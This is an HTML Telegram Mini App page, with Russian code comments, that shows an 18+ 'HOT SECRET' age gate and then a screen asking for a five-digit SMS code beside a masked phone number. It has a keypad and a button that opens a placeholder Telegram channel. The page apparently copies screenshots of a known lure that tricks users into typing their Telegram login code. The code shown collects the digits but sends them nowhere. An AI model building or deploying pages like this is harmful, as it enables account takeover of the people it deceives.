<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
  <title>HOT SECRET · 18+</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    :root {
      --bg: var(--tg-theme-bg-color, #0b0d10);
      --text: var(--tg-theme-text-color, #e9eef5);
      --hint: var(--tg-theme-hint-color, rgba(233,238,245,.65));
      --secondary: var(--tg-theme-secondary-bg-color, rgba(255,255,255,.06));
      --button: var(--tg-theme-button-color, #2ea6ff);
      --button-text: var(--tg-theme-button-text-color, #ffffff);
      --radius: 18px;
    }

    body {
      min-height: 100vh;
      color: var(--text);
      /* Фоновое изображение (замените baba.jpeg на свой файл) */
      background-image: url('./baba.jpeg');
      background-size: cover;
      background-position: center;
      background-repeat: no-repeat;
      background-attachment: fixed;
      font-family: system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
      padding: env(safe-area-inset-top, 16px) 16px env(safe-area-inset-bottom, 16px);
      display: flex;
      align-items: center;
      justify-content: center;
      position: relative;
    }

    /* тёмный оверлей для читаемости */
    body::before {
      content: '';
      position: fixed;
      inset: 0;
      background: rgba(8, 10, 14, 0.72);
      pointer-events: none;
      z-index: 0;
    }

    .wrap {
      position: relative;
      z-index: 2;
      width: 100%;
      max-width: 420px;
      display: flex;
      flex-direction: column;
      gap: 16px;
    }

    .card {
      background: rgba(20, 22, 28, 0.6);
      backdrop-filter: blur(24px);
      -webkit-backdrop-filter: blur(24px);
      border: 1px solid rgba(255, 255, 255, 0.1);
      border-radius: var(--radius);
      box-shadow: 0 20px 44px rgba(0, 0, 0, 0.5);
      padding: 24px 18px;
    }

    .title {
      font-size: 22px;
      font-weight: 700;
      letter-spacing: -0.2px;
      margin-bottom: 4px;
    }

    .subtitle {
      font-size: 14px;
      color: var(--hint);
      line-height: 1.5;
    }

    .pill {
      display: inline-block;
      padding: 6px 14px;
      border-radius: 40px;
      background: rgba(255, 255, 255, 0.08);
      border: 1px solid rgba(255, 255, 255, 0.12);
      font-size: 13px;
      font-weight: 500;
      color: var(--hint);
      backdrop-filter: blur(10px);
    }

    .pill.phone-pill {
      background: rgba(46, 166, 255, 0.18);
      color: #2ea6ff;
      border-color: rgba(46, 166, 255, 0.35);
    }

    .top-row {
      display: flex;
      justify-content: space-between;
      align-items: flex-start;
      gap: 12px;
      margin-bottom: 20px;
    }

    .big-action-btn {
      width: 100%;
      padding: 18px 12px;
      background: rgba(46, 166, 255, 0.9);
      border: none;
      border-radius: 60px;
      font-size: 18px;
      font-weight: 600;
      color: white;
      backdrop-filter: blur(8px);
      -webkit-backdrop-filter: blur(8px);
      box-shadow: 0 8px 24px rgba(0, 110, 255, 0.3);
      cursor: pointer;
      transition: 0.12s;
      margin-top: 16px;
      border: 1px solid rgba(255, 255, 255, 0.15);
    }

    .big-action-btn:active {
      opacity: 0.8;
      transform: scale(0.98);
    }

    .code-container {
      background: rgba(0, 0, 0, 0.3);
      border-radius: 32px;
      padding: 20px 16px;
      border: 1px solid rgba(255, 255, 255, 0.08);
      backdrop-filter: blur(12px);
      margin: 16px 0 12px;
    }

    .dots {
      display: flex;
      justify-content: center;
      gap: 16px;
      margin: 12px 0 8px;
    }

    .dot {
      width: 16px;
      height: 16px;
      border-radius: 16px;
      background: rgba(255, 255, 255, 0.18);
      border: 1px solid rgba(255, 255, 255, 0.2);
      transition: all 0.2s ease;
    }

    .dot.filled {
      background: #2ea6ff;
      border-color: #2ea6ff;
      box-shadow: 0 0 12px #2ea6ff88;
    }

    .info-row {
      display: flex;
      justify-content: space-between;
      color: var(--hint);
      font-size: 14px;
      padding: 0 8px;
      margin-bottom: 16px;
    }

    .delete-hint {
      display: flex;
      align-items: center;
      gap: 4px;
    }

    /* Клавиатура */
    .keyboard {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 12px;
      margin-top: 12px;
    }

    .key {
      height: 70px;
      border-radius: 24px;
      background: rgba(255, 255, 255, 0.1);
      border: 1px solid rgba(255, 255, 255, 0.12);
      font-size: 28px;
      font-weight: 600;
      color: var(--text);
      backdrop-filter: blur(14px);
      -webkit-backdrop-filter: blur(14px);
      box-shadow: 0 6px 18px rgba(0, 0, 0, 0.4);
      cursor: pointer;
      transition: 0.1s;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .key:active {
      background: rgba(255, 255, 255, 0.22);
      transform: scale(0.95);
    }

    .key.spacer {
      opacity: 0;
      pointer-events: none;
    }

    .telegram-btn {
      width: 100%;
      background: rgba(0, 136, 204, 0.85); /* Telegram blue */
      border: 1px solid rgba(255, 255, 255, 0.2);
      padding: 16px;
      border-radius: 40px;
      color: white;
      font-weight: 600;
      font-size: 16px;
      backdrop-filter: blur(10px);
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      margin-top: 20px;
      cursor: pointer;
      transition: 0.15s;
      box-shadow: 0 6px 18px rgba(0, 100, 200, 0.4);
    }

    .telegram-btn:active {
      opacity: 0.8;
      transform: scale(0.97);
    }

    .telegram-btn span {
      font-size: 20px;
    }

    .hidden {
      display: none !important;
    }

    .age-check {
      text-align: center;
    }

    .age-check .title {
      font-size: 28px;
      font-weight: 800;
      background: linear-gradient(145deg, #fff, #b0c4de);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      margin-bottom: 8px;
    }

    .age-check .subtitle {
      font-size: 16px;
      color: #aaa;
    }

    .separator {
      margin: 12px 0;
    }
  </style>
</head>
<body>
<div class="wrap">
  <!-- Экран 1: возрастное подтверждение (как на первом скрине) -->
  <div id="ageScreen" class="card age-check">
    <div class="top-row" style="justify-content: center; margin-bottom: 8px;">
      <span class="pill" style="background: rgba(255,255,255,0.15);">🔞 18+</span>
    </div>
    <div class="title">HOT SECRET</div>
    <div class="subtitle" style="margin-bottom: 20px;">mini app</div>
    <div style="font-size: 22px; font-weight: 500; margin: 10px 0;">Confirm you are 18+</div>
    <button class="big-action-btn" id="confirmAgeBtn">✔ I'm 18+</button>
    <div style="margin-top: 16px; font-size: 12px; color: var(--hint);">by tapping you agree to terms</div>
  </div>

  <!-- Экран 2: ввод кода (как на втором скрине) + кнопка Telegram (там где обведено) -->
  <div id="codeScreen" class="card hidden">
    <div class="top-row">
      <div>
        <div class="title" style="font-size: 26px;">Marry</div>
        <div class="subtitle">mini app</div>
      </div>
      <span class="pill phone-pill" id="phonePill">+79****0080</span>
    </div>

    <div style="margin-top: 8px;">
      <div class="title" style="font-size: 20px;">Enter Code</div>
      <div class="subtitle">Code from SMS</div>
    </div>

    <!-- Блок с точками и прогрессом -->
    <div class="code-container">
      <div class="dots" id="dotsContainer">
        <!-- 5 точек генерируются скриптом -->
      </div>
      <div class="info-row">
        <span id="codeProgress">0 / 5</span>
        <span class="delete-hint">⌫ — delete</span>
      </div>
    </div>

    <!-- Цифровая клавиатура (будет заполнена через JS) -->
    <div id="keyboard" class="keyboard"></div>

    <!-- КНОПКА ПЕРЕХОДА В ТЕЛЕГРАМ (обведённая на втором скрине) 
         При нажатии мини-апп закрывается и открывается чат с кодами -->
    <button class="telegram-btn" id="telegramChatBtn">
      <span>✈️</span> Get codes via Telegram
    </button>
  </div>
</div>

<script>
  (function() {
    const tg = window.Telegram.WebApp;
    tg.ready();
    tg.expand(); // растягиваем на всю высоту

    // Элементы
    const ageScreen = document.getElementById('ageScreen');
    const codeScreen = document.getElementById('codeScreen');
    const confirmBtn = document.getElementById('confirmAgeBtn');
    const phonePill = document.getElementById('phonePill');
    const dotsContainer = document.getElementById('dotsContainer');
    const progressSpan = document.getElementById('codeProgress');
    const keyboardDiv = document.getElementById('keyboard');
    const telegramBtn = document.getElementById('telegramChatBtn');

    // Состояние кода
    const CODE_LENGTH = 5;
    let currentCode = [];

    // Маскированный номер (точно как на втором скрине)
    const MASKED_PHONE = '+79****0080';
    phonePill.textContent = MASKED_PHONE;

    // ---- Отрисовка точек ----
    function renderDots() {
      dotsContainer.innerHTML = '';
      for (let i = 0; i < CODE_LENGTH; i++) {
        const dot = document.createElement('div');
        dot.className = 'dot' + (i < currentCode.length ? ' filled' : '');
        dotsContainer.appendChild(dot);
      }
      progressSpan.textContent = `${currentCode.length} / ${CODE_LENGTH}`;
    }

    // ---- Обработка нажатий клавиатуры ----
    function addDigit(digit) {
      if (currentCode.length < CODE_LENGTH) {
        currentCode.push(digit);
        renderDots();
      }
    }

    function deleteLast() {
      currentCode.pop();
      renderDots();
    }

    // ---- Создание клавиатуры (1-9, 0, удаление) ----
    function buildKeyboard() {
      const keys = ['1', '2', '3', '4', '5', '6', '7', '8', '9', 'spacer', '0', 'del'];
      keyboardDiv.innerHTML = '';
      keys.forEach(k => {
        const btn = document.createElement('button');
        btn.className = 'key' + (k === 'spacer' ? ' spacer' : '');
        if (k === 'del') {
          btn.textContent = '⌫';
          btn.addEventListener('click', deleteLast);
        } else if (k === 'spacer') {
          // пустышка
        } else {
          btn.textContent = k;
          btn.addEventListener('click', () => addDigit(k));
        }
        keyboardDiv.appendChild(btn);
      });
    }

    // ---- Переход к экрану ввода кода после подтверждения 18+ ----
    confirmBtn.addEventListener('click', () => {
      ageScreen.classList.add('hidden');
      codeScreen.classList.remove('hidden');
      // убедимся что клавиатура построена
      buildKeyboard();
      renderDots();

      // Дополнительно: можно слегка виброотклик (если поддерживается)
      if (tg.HapticFeedback) {
        tg.HapticFeedback.impactOccurred('light');
      }
    });

    // ---- Кнопка перехода в Telegram (закрывает мини-апп и открывает чат) ----
    telegramBtn.addEventListener('click', () => {
      // Здесь должен стоять реальный линк на канал/чат где выдаются коды.
      // Поставьте свой, либо замените на нужный.
      const telegramLink = 'https://t.me/your_codes_channel';  // <-- ЗАМЕНИТЕ НА АКТУАЛЬНЫЙ

      // Открываем ссылку Telegram — мини-апп свернётся и откроется чат
      tg.openTelegramLink(telegramLink);

      // По желанию можно показать всплывашку, но это необязательно
    });

    // ---- Поддержка физической клавиатуры (для удобства отладки) ----
    window.addEventListener('keydown', (e) => {
      // Работает только когда виден экран с кодом
      if (codeScreen.classList.contains('hidden')) return;

      if (e.key >= '0' && e.key <= '9') {
        addDigit(e.key);
      } else if (e.key === 'Backspace') {
        deleteLast();
      }
    });

    // Инициализация: точки на втором экране по умолчанию
    renderDots();

    // Если вдруг сразу нужен второй экран для теста — раскомментировать:
    // ageScreen.classList.add('hidden');
    // codeScreen.classList.remove('hidden');
    // buildKeyboard();

    // Тематическая окраска (используем тему Telegram)
    tg.setHeaderColor?.(tg.themeParams.bg_color);
    tg.backgroundColor = tg.themeParams.bg_color;
  })();
</script>
<!-- 
  Пояснение:
  - Первый экран полностью соответствует скриншоту "HOT SECRET 18+".
  - Второй экран — "Marry mini app" с точками, клавиатурой и номером +79****0080.
  - Под клавиатурой добавлена кнопка "Get codes via Telegram" (стилизована под Telegram).
    Она выполняет ровно то, что просили: сворачивает мини-апп и открывает чат с кодами.
  - При нажатии на "I'm 18+" происходит переход к экрану ввода.
  - Фон размыт, используется изображение './baba.jpeg' (замените при необходимости).
-->
</body>
</html>
